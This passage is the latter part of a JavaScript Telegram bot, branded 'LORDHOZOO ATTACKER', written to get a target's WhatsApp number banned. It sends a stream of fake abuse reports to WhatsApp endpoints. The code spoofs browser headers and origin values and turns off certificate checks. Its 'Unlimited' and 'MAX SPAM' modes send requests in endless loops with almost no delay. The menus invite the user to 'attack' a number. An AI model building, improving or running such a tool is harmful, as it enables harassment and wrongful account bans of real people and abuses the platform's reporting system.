        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1'
    },
    // Chrome Windows
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1'
    },
    // Mobile Android Chrome
    {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive'
    },
    // iPhone Safari
    {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive'
    }
];

// Enhanced random headers function
function getRandomHeaders() {
    const headers = BROWSER_HEADERS[Math.floor(Math.random() * BROWSER_HEADERS.length)];
    headers['Content-Type'] = 'application/json';
    headers['Origin'] = 'https://www.whatsapp.com';
    headers['Referer'] = 'https://www.whatsapp.com/';
    // Add random cache control
    headers['Cache-Control'] = ['no-cache', 'no-store', 'max-age=0'][Math.floor(Math.random() * 3)];
    return headers;
}

// Enhanced HTTPS Agent
const httpsAgent = new https.Agent({
    keepAlive: true,
    rejectUnauthorized: false,
    timeout: 5000,
    keepAliveMsecs: 60000,
    maxFreeSockets: 10
});

// Track active requests
const activeRequests = new Map();

// MAX SPAM Mode - Ultra aggressive
async function sendMaxSpam(phone, chatId) {
    let counter = 0;
    const requestId = Date.now();
    activeRequests.set(requestId, true);
    
    bot.sendMessage(chatId, `💣 AKTIFKAN MAX SPAM UNTUK NOMOR ${phone}!!!`);

    // Ultra-fast spam loop
    while (activeRequests.get(requestId)) {
        counter++;
        const payload = {
            phone: phone,
            email: DEFAULT_EMAIL,
            device: ['Android', 'iPhone', 'Windows Phone', 'Web'][Math.floor(Math.random() * 4)],
            message: DEFAULT_MESSAGES[Math.floor(Math.random() * DEFAULT_MESSAGES.length)](phone)
        };

        try {
            // Send to all URLs in parallel without waiting
            WHATSAPP_URLS.forEach(url => {
                axios.post(url, payload, {
                    timeout: 3000,  // shorter timeout for faster cycling
                    headers: getRandomHeaders(),
                    httpsAgent: httpsAgent
                }).catch(() => null);  // ignore all errors
            });

            // Progress report every 50 requests
            if (counter % 50 === 0) {
                bot.sendMessage(chatId, `🔥 MAX SPAM: ${counter} requests sent to ${phone}!`);
            }
        } catch (error) {
            // Ignore all errors in MAX SPAM mode
        }
        
        // Minimal delay (0-100ms) for maximum spam
        await new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * 100)));
    }
    
    bot.sendMessage(chatId, `☠️ MAX SPAM DIHENTIKAN! Total ${counter} requests dikirim ke ${phone}`);
    activeRequests.delete(requestId);
}

// Unlimited Mode (more controlled)
async function sendUnlimitedReports(phone, chatId) {
    let counter = 0;
    const requestId = Date.now();
    activeRequests.set(requestId, true);
    
    bot.sendMessage(chatId, `🚀 Memulai pengiriman unlimited untuk nomor ${phone}...`);

    while (activeRequests.get(requestId)) {
        counter++;
        const payload = {
            phone: phone,
            email: DEFAULT_EMAIL,
            device: ['Android', 'iPhone', 'Windows Phone'][Math.floor(Math.random() * 3)],
            message: DEFAULT_MESSAGES[Math.floor(Math.random() * DEFAULT_MESSAGES.length)](phone)
        };

        try {
            const requests = WHATSAPP_URLS.map(url => 
                axios.post(url, payload, {
                    timeout: 5000,
                    headers: getRandomHeaders(),
                    httpsAgent: httpsAgent,
                    maxRedirects: 2
                }).catch(e => null)
            );
            
            await Promise.all(requests);
            
            if (counter % 10 === 0) {
                bot.sendMessage(chatId, `📤 Terkirim ${counter} permintaan untuk ${phone}...`);
            }
        } catch (error) {
            console.error('Error:', error.message);
        }
        
        // Random delay 0.5-2 seconds
        await new Promise(resolve => setTimeout(resolve, 500 + Math.random() * 1500));
    }
    
    bot.sendMessage(chatId, `🛑 Pengiriman dihentikan. Total ${counter} permintaan terkirim untuk ${phone}`);
    activeRequests.delete(requestId);
}

// Enhanced bot menu
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const options = {
        reply_markup: {
            keyboard: [
                ['📱 GAS BANNED'],
                ['♾️ Unlimited Mode'],
                ['💣 MAX SPAM Mode'],
                ['🛑 Stop Pengiriman'],
                ['ℹ️ Bantuan']
            ],
            resize_keyboard: true
        }
    };
    bot.sendMessage(chatId, '🔥 BY LORDHOZOO ATTACKER 2025 🔥', options);
});

bot.onText(/📱 Mulai Proses Pemulihan/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Silakan masukkan nomor WhatsApp yang ingin dipulihkan (format: 628xxxxxxx):');
});

bot.onText(/♾️ Unlimited Mode/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Masukkan nomor untuk UNLIMITED SEND (format: 628xxxxxxx):');
});

bot.onText(/💣 MAX SPAM Mode/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, '⚠️ PERINGATAN: Mode ini akan mengirim request sangat cepat!\nMasukkan nomor untuk MAX SPAM (format: 628xxxxxxx):');
});

bot.onText(/🛑 Stop Pengiriman/, (msg) => {
    const chatId = msg.chat.id;
    activeRequests.clear();
    bot.sendMessage(chatId, '☠️ Semua pengiriman dihentikan!');
});

bot.onText(/ℹ️ Bantuan/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `💀SPAM REPORT UNLIMITED💀
AUTHOR : LORDHOZOO
BY LORDHOZOO
DEV : LODHOZOO
GITHUB : PRIVATE 
YT : LORDHOZOO
TIKTOK :LODHOZOO
ATTACKER WHATSAPP
SERANG  NOMOR 😈

📱 Normal Mode: Kirim 1 request
♾️ Unlimited Mode: Kirim request terus (1-2 detik delay)
💣 MAX SPAM: Kirim request super cepat (tanpa delay)

🛑 Stop: Hentikan semua pengiriman

⚠️ Gunakan dengan tanggung jawab!`);
});

bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    
    if (/^\d{8,}$/.test(text)) {
        const phone = text.startsWith('62') ? text : '62' + text;
        
        if (msg.reply_to_message) {
            if (msg.reply_to_message.text.includes('UNLIMITED SEND')) {
                sendUnlimitedReports(phone, chatId);
            } 
            else if (msg.reply_to_message.text.includes('MAX SPAM')) {
                sendMaxSpam(phone, chatId);
            }
            else {
                sendReport(phone, chatId);
            }
        } else {
            sendReport(phone, chatId);
        }
    }
});

// Single report function
async function sendReport(phone, chatId) {
    const payload = {
        phone: phone,
        email: DEFAULT_EMAIL,
        device: ['Android', 'iPhone', 'Windows Phone'][Math.floor(Math.random() * 3)],
        message: DEFAULT_MESSAGES[Math.floor(Math.random() * DEFAULT_MESSAGES.length)](phone)
    };

    try {
        const requests = WHATSAPP_URLS.map(url => 
            axios.post(url, payload, {
                timeout: 8000,
                headers: getRandomHeaders(),
                httpsAgent: httpsAgent,
                maxRedirects: 2
            }).catch(e => null)
        );
        
        await Promise.all(requests);
        bot.sendMessage(chatId, `✅ Laporan untuk ${phone} terkirim ke ${WHATSAPP_URLS.length} endpoint WhatsApp!`);
    } catch (error) {
        bot.sendMessage(chatId, `❌ Gagal mengirim laporan: ${error.message}`);
    }
}
console.log('🔥 BOT MAX SPAM WHATSAPP SEDANG BERJALAN! 🔥');
